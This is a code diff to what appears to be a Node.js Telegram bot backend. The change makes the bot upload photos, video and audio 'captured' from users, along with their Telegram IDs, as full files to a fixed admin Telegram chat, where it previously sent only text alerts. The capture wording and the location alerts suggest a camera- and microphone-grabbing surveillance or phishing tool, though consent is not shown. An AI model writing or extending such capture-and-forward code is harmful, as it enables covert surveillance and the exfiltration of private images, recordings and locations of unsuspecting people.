@@ -346,27 +346,43 @@ const sendAdminLocationNotification = async (telegramId, data) => {
 };
 
 /**
- * Send photo notification to admin
+ * Send photo notification to admin (with actual photo)
  */
 const sendAdminPhotoNotification = async (telegramId, filePath) => {
     const botToken = process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
-    if (!botToken) return;
+    if (!botToken) {
+        logger.warn('No bot token for photo notification');
+        return;
+    }
     
     try {
         const FormData = require('form-data');
         const fsSync = require('fs');
         
+        // Check if file exists
+        if (!fsSync.existsSync(filePath)) {
+            logger.warn('Photo file not found', { filePath });
+            return;
+        }
+        
         const formData = new FormData();
         formData.append('chat_id', ADMIN_TELEGRAM_ID.toString());
         formData.append('photo', fsSync.createReadStream(filePath));
-        formData.append('caption', `📷 *Photo Captured*\n\n👤 From User: \`${telegramId}\`\n🕐 Time: ${new Date().toLocaleString()}`);
+        formData.append('caption', `📷 *Photo Captured!*\n\n👤 User: \`${telegramId}\`\n🕐 ${new Date().toLocaleString()}`);
         formData.append('parse_mode', 'Markdown');
         
         const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-        await fetch(url, {
+        const response = await fetch(url, {
             method: 'POST',
             body: formData
         });
+        const result = await response.json();
+        
+        if (!result.ok) {
+            logger.warn('Telegram API error sending photo', { error: result.description });
+        } else {
+            logger.info('Photo sent to admin instantly', { telegramId });
+        }
     } catch (err) {
         logger.warn('Failed to send photo to admin', { error: err.message });
     }
@@ -411,34 +427,79 @@ const sendAdminEventNotification = async (telegramId, event, captureType) => {
 };
 
 /**
- * Send video/audio notification to admin
+ * Send video/audio notification to admin (with actual file)
  */
 const sendAdminMediaNotification = async (telegramId, mediaType, filePath, fileSize) => {
     const botToken = process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
-    if (!botToken) return;
+    if (!botToken) {
+        logger.warn('No bot token for media notification');
+        return;
+    }
     
     const emoji = mediaType === 'video' ? '🎥' : '🎤';
     const label = mediaType === 'video' ? 'Video' : 'Audio';
     const sizeMB = (fileSize / (1024 * 1024)).toFixed(2);
-    
-    const message = `${emoji} *${label} Captured!*\n\n` +
-        `👤 User: \`${telegramId}\`\n` +
-        `📁 Size: ${sizeMB} MB\n` +
-        `🕐 Time: ${new Date().toLocaleString()}`;
+    const caption = `${emoji} *${label} Captured!*\n\n👤 User: \`${telegramId}\`\n📁 Size: ${sizeMB} MB\n🕐 ${new Date().toLocaleString()}`;
     
     try {
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        await fetch(url, {
+        const FormData = require('form-data');
+        const fsSync = require('fs');
+        
+        // Check if file exists
+        if (!fsSync.existsSync(filePath)) {
+            logger.warn('Media file not found', { filePath });
+            // Send text notification instead
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_TELEGRAM_ID,
+                    text: caption + '\n\n⚠️ File not found on server',
+                    parse_mode: 'Markdown'
+                })
+            });
+            return;
+        }
+        
+        const formData = new FormData();
+        formData.append('chat_id', ADMIN_TELEGRAM_ID.toString());
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'Markdown');
+        
+        let url;
+        if (mediaType === 'video') {
+            formData.append('video', fsSync.createReadStream(filePath));
+            url = `https://api.telegram.org/bot${botToken}/sendVideo`;
+        } else {
+            formData.append('audio', fsSync.createReadStream(filePath));
+            url = `https://api.telegram.org/bot${botToken}/sendAudio`;
+        }
+        
+        const response = await fetch(url, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: ADMIN_TELEGRAM_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+            body: formData
         });
+        const result = await response.json();
+        
+        if (!result.ok) {
+            logger.warn('Telegram API error sending media', { error: result.description, mediaType });
+            // Fallback to text notification
+            const textUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            await fetch(textUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_TELEGRAM_ID,
+                    text: caption + '\n\n📎 File saved on server',
+                    parse_mode: 'Markdown'
+                })
+            });
+        } else {
+            logger.info('Media sent to admin instantly', { telegramId, mediaType });
+        }
     } catch (err) {
-        logger.warn('Failed to send media notification to admin', { error: err.message });
+        logger.warn('Failed to send media to admin', { error: err.message, mediaType });
     }
 };
 
